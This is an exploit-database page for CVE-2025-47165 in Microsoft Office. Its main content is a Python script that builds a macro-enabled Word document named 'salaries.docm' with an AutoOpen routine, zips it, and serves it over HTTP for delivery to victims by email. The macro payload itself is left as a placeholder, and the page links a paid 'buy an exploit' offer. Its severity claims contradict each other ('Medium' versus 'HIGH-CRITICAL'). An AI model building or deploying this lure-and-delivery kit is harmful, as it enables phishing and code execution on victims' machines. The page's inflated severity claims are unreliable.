---
title: Microsoft Excel LTSC Professional Pilus 2021 - Microsoft® Word LTSC MSO (16.0.14334.20090) 64-bit - Remote Code Execution Bypa
url: https://cxsecurity.com/issue/WLB-2025060024
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-26
fetch_date: 2025-10-06T22:52:22.821961
---

# Microsoft Excel LTSC Professional Pilus 2021 - Microsoft® Word LTSC MSO (16.0.14334.20090) 64-bit - Remote Code Execution Bypa

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Microsoft Excel LTSC Professional Pilus 2021 - Microsoft® Word LTSC MSO (16.0.14334.20090) 64-bit - Remote Code Execution Bypass - ZIP (RCE)** **2025.06.25**  **![bg](https://cert.cx/cxstatic/images/flags/bg.png) [nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/) **(BG)** ![bg](https://cert.cx/cxstatic/images/flags/bg.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Titles: Microsoft Excel LTSC Professional Pilus 2021 - Microsoft® Word LTSC MSO (16.0.14334.20090) 64-bit - Remote Code Execution Bypass - ZIP (RCE)
# Author: nu11secur1ty
# Date: 06/24/2025
# Vendor: Microsoft
# Software: https://www.microsoft.com/en/microsoft-365/excel?market=af
# Reference: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47165
# CVE-2025-47165
# Versions: Microsoft Office LTSC 2024 , Microsoft Office LTSC 2021, Microsoft 365 Apps for Enterprise
## Description:
The attacker can trick any user into opening and executing their code by
sending a malicious DOCM file via email or a streaming server. After the
execution of the victim, his machine can be infected or even worse than
ever; this could be the end of his Windows machine! WARNING: AMPOTATE THE
MACROS OPTIONS FROM YOUR OFFICE 365!!!
STATUS: HIGH-CRITICAL Vulnerability
[+]Exploit:
```
#!/usr/bin/python
# CVE-2025-47165
# https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-47165
# by nu11secur1ty
import os
import sys
import pythoncom
from win32com.client import Dispatch
import http.server
import socketserver
import socket
import threading
import zipfile
PORT = 8000
DOCM\_FILENAME = "salaries.docm"
ZIP\_FILENAME = "salaries.zip"
DIRECTORY = "."
def create\_docm\_with\_macro(filename=DOCM\_FILENAME):
pythoncom.CoInitialize()
word = Dispatch("Word.Application")
word.Visible = False
try:
doc = word.Documents.Add()
vb\_project = doc.VBProject
vb\_component = vb\_project.VBComponents("ThisDocument")
macro\_code = '''
Sub AutoOpen()
//YOUR EXPLOIT HERE
// All OF YPU PLEASE WATCH THE DEMO VIDEO
// Best Regards to packetstorm.news and OFFSEC
End Sub
'''
vb\_component.CodeModule.AddFromString(macro\_code)
doc.SaveAs(os.path.abspath(filename), FileFormat=13)
print(f"[+] Macro-enabled Word document created: {filename}")
except Exception as e:
print(f"[!] Error creating document: {e}")
finally:
doc.Close(False)
word.Quit()
pythoncom.CoUninitialize()
def zip\_docm(docm\_path, zip\_path):
with zipfile.ZipFile(zip\_path, 'w', compression=zipfile.ZIP\_DEFLATED) as zipf:
zipf.write(docm\_path, arcname=os.path.basename(docm\_path))
print(f"[+] Created ZIP archive: {zip\_path}")
def get\_local\_ip():
s = socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM)
try:
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]
except Exception:
ip = "127.0.0.1"
finally:
s.close()
return ip
class Handler(http.server.SimpleHTTPRequestHandler):
def \_\_init\_\_(self, \*args, \*\*kwargs):
super().\_\_init\_\_(\*args, directory=DIRECTORY, \*\*kwargs)
def run\_server():
ip = get\_local\_ip()
print(f"[+] Starting HTTP server on http://{ip}:{PORT}")
print(f"[+] Place your macro docm and zip files in this directory to serve them.")
print(f"[+] Access the ZIP file at: http://{ip}:{PORT}/{ZIP\_FILENAME}")
with socketserver.TCPServer(("", PORT), Handler) as httpd:
print("[+] Server running, press Ctrl+C to stop")
httpd.serve\_forever()
if \_\_name\_\_ == "\_\_main\_\_":
if os.name != "nt":
print("[!] This script only runs on Windows with MS Word installed.")
sys.exit(1)
print("[\*] Creating the macro-enabled document...")
create\_docm\_with\_macro(DOCM\_FILENAME)
print("[\*] Creating ZIP archive of the document...")
zip\_docm(DOCM\_FILENAME, ZIP\_FILENAME)
print("[\*] Starting HTTP server in background thread...")
server\_thread = threading.Thread(target=run\_server, daemon=True)
server\_thread.start()
try:
while True:
pass # Keep main thread alive
except KeyboardInterrupt:
print("\n[!] Server stopped by user.")
```
# Reproduce:
[href](https://www.youtube.com/watch?v=CSb76-OG-Tg)
# Buy an exploit only:
[href](https://satoshidisk.com/pay/COiBVA)
# Time spent:
01:37:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/
https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
0day Exploit DataBase https://0day.today/
home page: https://www.nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <http://nu11secur1ty.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060024)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top